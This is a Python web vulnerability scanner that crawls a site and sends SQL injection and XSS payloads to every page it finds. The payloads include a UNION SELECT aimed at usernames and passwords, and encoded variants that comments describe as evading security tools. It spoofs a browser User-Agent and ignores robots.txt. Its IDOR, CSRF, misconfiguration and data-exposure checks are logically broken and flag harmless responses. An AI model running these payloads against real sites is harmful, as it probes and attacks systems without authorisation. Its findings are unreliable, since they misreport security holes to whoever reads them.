import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, quote_plus, quote
import base64
import time

async def crawl_website(url):
    """
    This function crawls a website starting from the given URL.
    It finds all the internal links on the website and checks for common vulnerabilities:
    - SQL Injection
    - Cross-Site Scripting (XSS)
    - Insecure Direct Object Reference (IDOR)
    - Cross-Site Request Forgery (CSRF)
    - Security Misconfiguration
    - Sensitive Data Exposure.

    It also fetches the `robots.txt` file and analyzes it to get Allow and Disallow rules.

    :param url: The URL of the website to crawl
    :return: A dictionary containing the found endpoints, vulnerabilities, and robots.txt analysis
    """
    visited = set()  # Set to store visited URLs
    vulnerabilities = {
        "SQL Injection": [],
        "Cross-Site Scripting (XSS)": [],
        "Insecure Direct Object Reference (IDOR)": [],
        "Cross-Site Request Forgery (CSRF)": [],
        "Security Misconfiguration": [],
        "Sensitive Data Exposure": []
    }  # Dictionary to store found vulnerabilities by category
    endpoints = []  # List to store found endpoints
    robots_txt_content = await fetch_robots_txt(url)  # Fetch robots.txt
    #base_domain = urlparse(url).netloc  # Get the base domain

    # Analyze robots.txt to get Allow and Disallow rules
    robots_analysis = analyze_robots_txt(robots_txt_content)

    async def crawl(current_url):
        if current_url in visited:
            return
        visited.add(current_url)

        print(f"Visiting: {current_url}") 

        # Check if the URL belongs to the same domain (or not in scope)
        if not is_same_domain(url, current_url):
            print(f"Skipping {current_url}: Not in the same domain") 
            return

        try:
            # Change the User-Agent to avoid being blocked by some websites
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.3'
            }
            response = requests.get(current_url, headers=headers)
            if response.status_code != 200:
                print(f"Failed to retrieve {current_url}: Status code {response.status_code}")
                return
            
            soup = BeautifulSoup(response.text, 'html.parser')
            endpoints.append(current_url)

            # Find links on the page
            for link in soup.find_all('a', href=True):
                absolute_link = urljoin(current_url, link['href'])
                await crawl(absolute_link)

            # Check for SQL Injection vulnerabilities
            sqli_result = check_sql_injection(current_url)
            if sqli_result['vulnerability'] == "SQL Injection":
                vulnerabilities["SQL Injection"].append({
                    "url": sqli_result['test_url'],
                    "payload": sqli_result['payload'],
                    "error_pattern": sqli_result.get('error_pattern', 'None')
                })
                print(f"+ SQL Injection vulnerability found at: {sqli_result['test_url']} with payload: {sqli_result['payload']}")


            xss_result = check_xss(current_url)
            if xss_result["vulnerabilities"]:
                for vuln in xss_result["vulnerabilities"]:
                    vulnerabilities["Cross-Site Scripting (XSS)"].append({
                        "url": vuln["url"],
                        "payload": vuln["payload"],
                        "response_excerpt": vuln.get("response_excerpt", 'None')
                    })
                    print(f"+ XSS vulnerability found at: {vuln['url']} with payload: {vuln['payload']}")

            if check_idor(current_url):
                vulnerabilities["Insecure Direct Object Reference (IDOR)"].append(current_url)
                print(f"+ IDOR vulnerability found at: {current_url}")

            if check_csrf(current_url):
                vulnerabilities["Cross-Site Request Forgery (CSRF)"].append(current_url)
                print(f"+ CSRF vulnerability found at: {current_url}")

            if check_security_misconfiguration(current_url):
                vulnerabilities["Security Misconfiguration"].append(current_url)
                print(f"+ Security Misconfiguration found at: {current_url}")

            if check_sensitive_data_exposure(current_url):
                vulnerabilities["Sensitive Data Exposure"].append(current_url)
                print(f"+ Sensitive Data Exposure found at: {current_url}")

        except Exception as e:
            print(f"Error crawling {current_url}: {e}")

    await crawl(url)

    return {
        "endpoints": endpoints,
        "vulns": vulnerabilities,
        "robots_txt": robots_analysis
    }

async def fetch_robots_txt(url):
    parsed_url = urlparse(url)
    robots_url = f"{parsed_url.scheme}://{parsed_url.netloc}/robots.txt"
    try:
        # Change the User-Agent to avoid being blocked by some websites
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.3'
        }
        response = requests.get(robots_url, headers=headers)
        if response.status_code == 200:
            print(f"Fetched robots.txt from {robots_url}")
            return response.text
        else:
            print(f"No robots.txt found at {robots_url}: Status code {response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"Error fetching robots.txt: {e}")
        return None

def analyze_robots_txt(robots_txt):
    """
    Function to analyze the contents of a robots.txt file.
    :param robots_txt: The content of the robots.txt file
    :return: A dictionary containing the Allow and Disallow rules
    """
    allow = []
    disallow = []
    if robots_txt:
        lines = robots_txt.splitlines()
        for line in lines:
            if line.startswith("Allow:"):
                allow.append(line.split(":")[1].strip())
            elif line.startswith("Disallow:"):
                disallow.append(line.split(":")[1].strip())
    return {
        "Allow": allow,
        "Disallow": disallow
    }

def is_same_domain(base_url, current_url):
    """
    Function to check if the current URL belongs to the same domain as the base URL.
    - It uses the base domain to compare with the current domain.
    - If the current domain starts with "www.", it is also considered the same domain.

    Example: is_same_domain("https://example.com", "https://www.example.com/page")
    Returns: True

    Example: is_same_domain("https://example.com", "https://another.com/page")
    Returns: False

    Example: is_same_domain("https://example.com", "https://sub.example.com/page")
    Returns: False

    :param base_url: The base URL
    :param current_url: The current URL to check
    :return: True if the current URL belongs to the same domain, False otherwise
    """
    base_domain = urlparse(base_url).netloc
    current_domain = urlparse(current_url).netloc
    return current_domain == base_domain or current_domain.startswith(f"www.{base_domain}")

def encode_base64(payload):
    # Encode a payload to Base64
    # Avoid detection by basic security tools
    return base64.b64encode(payload.encode()).decode()


def check_sql_injection(url):
    # Payloads comunes de SQLi con variantes ofuscadas, codificadas y comentadas
    sql_payloads = [
        "' OR '1'='1",  # Basic SQLi
        "' OR '1'='1' --",  # Inline comment SQLi
        "' OR '1'='1' /* comment */",  # Block comment SQLi
        "' OR sleep(5) --",  # Blind SQLi de tiempo
        "' UNION SELECT 1,2,3 --",  # Basic UNION SELECT
        "' UNION SELECT NULL,NULL,NULL --",  # Union con valores NULL
        "' UNION SELECT username,password FROM users --",  # Intento de extracción de datos
        "'||(SELECT 1 FROM DUAL)--",  # Oracle DB payload
        "' OR 'a'='a' /* test */",  # Ofuscación con comentarios
        
        # Payloads codificados en Base64
        encode_base64("' OR '1'='1'"),
        encode_base64("' OR sleep(5) --"),

        # Payloads codificados en URL (y doblemente codificados)
        quote_plus("' OR '1'='1'"),
        quote_plus("' OR sleep(5) --"),
        quote_plus(quote_plus("' OR '1'='1'")),
        
        # Payload ofuscado con comentarios divididos
        "'/**/OR/**/'1'/**/='1'/* test */",
        "' OR '1'/**/='1'/*comment*/--",
        
        # Codificado en Base64 + URL Encoding
        quote_plus(encode_base64("' OR '1'='1'")),
        quote_plus(encode_base64("' OR sleep(5) --"))
    ]

    # Patrones de error comunes en diferentes motores de base de datos
    error_patterns = [
        "syntax error",  # Error SQL genérico
        "mysql",  # MySQL
        "sql syntax",  # SQL genérico
        "warning: pg_",  # PostgreSQL
        "error in your sql",  # MySQL
        "unrecognized token",  # SQLite
        "odbc sql",  # ODBC
        "oracle error",  # Oracle
        "not a valid mysql",  # MySQL específico
        "ORA-",  # Errores Oracle
        "warning",  # Advertencias
        "sql server",  # Microsoft SQL Server
        "invalid sql statement"  # SQL inválido
    ]

    for payload in sql_payloads:
        # Se generan múltiples variantes del URL de prueba
        test_urls = [
            f"{url}?param={payload}",  # Prueba en un solo parámetro
            f"{url}?id=1&name={payload}",  # Prueba en otro parámetro
            f"{url}/{payload}",  # Prueba inyectando directamente en la URL
            f"{url}?param={payload}#fragment",  # Prueba en un fragmento de URL
        ]

        for test_url in test_urls:
            print(f"Testing SQL Injection with payload: {payload} on {test_url}")
            try:
                start_time = time.time()
                response = requests.get(test_url)
                response_time = time.time() - start_time

                # Verifica si el tiempo de respuesta es inusualmente largo (Blind SQLi de tiempo)
                if response_time > 5:
                    print(f"Possible Blind SQL Injection detected by response delay at: {test_url}")
                    return {"vulnerability": "SQL Injection", "payload": payload, "test_url": test_url}

                # Busca errores específicos de bases de datos en el contenido de la respuesta
                for pattern in error_patterns:
                    if pattern in response.text.lower():
                        print(f"Potential SQL Injection vulnerability detected at: {test_url} due to error pattern: {pattern}")
                        return {"vulnerability": "SQL Injection", "payload": payload, "test_url": test_url, "error_pattern": pattern}
                
                # Chequeo adicional para respuestas atípicas
                if "error" in response.text.lower() or "unexpected" in response.text.lower():
                    print(f"Potential SQL Injection vulnerability detected at: {test_url} due to generic error.")
                    return {"vulnerability": "SQL Injection", "payload": payload, "test_url": test_url, "error_pattern": "Generic error (Error/Unexpected)"}

            except requests.RequestException as e:
                print(f"Error checking SQL injection: {e}")

    return {"vulnerability": "None", "message": "No SQL Injection detected."}


def check_xss(url):
    """
    This function tests for potential XSS vulnerabilities by sending multiple variations of common XSS payloads
    in an encoded and obfuscated format. It only tests for PoC without altering data.
    
    :param url: The URL to test for XSS
    :return: A dictionary with information on potential XSS vulnerabilities detected
    """
    # List of common XSS payloads
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "'\"><script>alert('XSS')</script>",  # Breaking out of attributes or contexts
    ]
    
    # Obfuscated payloads using Base64 encoding and URL encoding
    obfuscated_payloads = []
    for payload in xss_payloads:
        # Base64 encoding of payloads
        base64_payload = base64.b64encode(payload.encode()).decode()
        obfuscated_payloads.append(f"data:text/html;base64,{base64_payload}")

        # URL encoding
        url_encoded_payload = quote(payload)
        obfuscated_payloads.append(url_encoded_payload)

        # Hex encoding (character by character)
        hex_payload = ''.join([f"%{hex(ord(c))[2:]}" for c in payload])
        obfuscated_payloads.append(hex_payload)

    all_payloads = xss_payloads + obfuscated_payloads

    # Storage of results
    vulnerabilities = []

    for payload in all_payloads:
        test_url = f"{url}?param={payload}"
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
        }
        print(f"Testing XSS with payload: {payload} on {test_url}")
        
        try:
            response = requests.get(test_url, headers=headers)
            
            # Basic check if the payload is reflected in the response (vulnerability indication)
            if payload in response.text:
                # Further checks to ensure the payload is executed or reflected in a script tag
                if any(tag in response.text for tag in ['<script>', 'onerror=', 'onload=', 'javascript:']):
                    print(f"Potential XSS vulnerability detected at: {test_url}")
                    vulnerabilities.append({
                        "url": test_url,
                        "payload": payload,
                        "response_excerpt": response.text[:500]  # First 500 characters for context
                    })
            
            # Alternative tests using POST requests (JSON input)
            post_test_payload = {'param': payload}
            post_response = requests.post(url, json=post_test_payload, headers={'Content-Type': 'application/json'})
            
            if payload in post_response.text:
                print(f"Potential XSS vulnerability in POST request at: {url} with payload: {payload}")
                vulnerabilities.append({
                    "url": url,
                    "payload": payload,
                    "method": "POST",
                    "response_excerpt": post_response.text[:500]  # First 500 characters for context
                })
        
        except requests.RequestException as e:
            print(f"Error checking XSS: {e}")

    # Return the found vulnerabilities
    return {
        "vulnerabilities": vulnerabilities,
        "test_payloads": all_payloads
    }

def check_idor(url):
    # This is a very basic check for IDOR
    test_id = 1  # Example ID, maybe adjust based on the application's context?
    test_url = f"{url}/resource/{test_id}"
    print(f"Testing IDOR with URL: {test_url}") 
    try:
        response = requests.get(test_url)
        if response.status_code == 200:
            print(f"IDOR vulnerability detected at: {url}") 
            return True
    except requests.RequestException as e:
        print(f"Error checking IDOR: {e}")

    return False

def check_csrf(url):
    # Simple check for CSRF vulnerabilities
    csrf_url = f"{url}/submit"  # Example URL for submission
    print(f"Testing CSRF vulnerability at: {csrf_url}") 
    try:
        response = requests.get(csrf_url)
        if response.status_code == 200 and "csrf" in response.text.lower():
            print(f"CSRF vulnerability detected at: {url}") 
            return True
    except requests.RequestException as e:
        print(f"Error checking CSRF: {e}")

    return False

def check_security_misconfiguration(url):
    # Very basic check for security misconfigurations
    print(f"Checking security misconfiguration at: {url}")
    try:
        response = requests.get(url)
        if "server" in response.headers and "apache" in response.headers["server"].lower():
            print(f"Security misconfiguration detected at: {url}")
            return True
    except requests.RequestException as e:
        print(f"Error checking security misconfiguration: {e}")

    return False

def check_sensitive_data_exposure(url):
    # Simple check for sensitive data exposure
    print(f"Checking for sensitive data exposure at: {url}")
    try:
        response = requests.get(url)
        if "password" in response.text.lower() or "secret" in response.text.lower():
            print(f"Sensitive data exposure detected at: {url}")
            return True
    except requests.RequestException as e:
        print(f"Error checking sensitive data exposure: {e}")

    return False
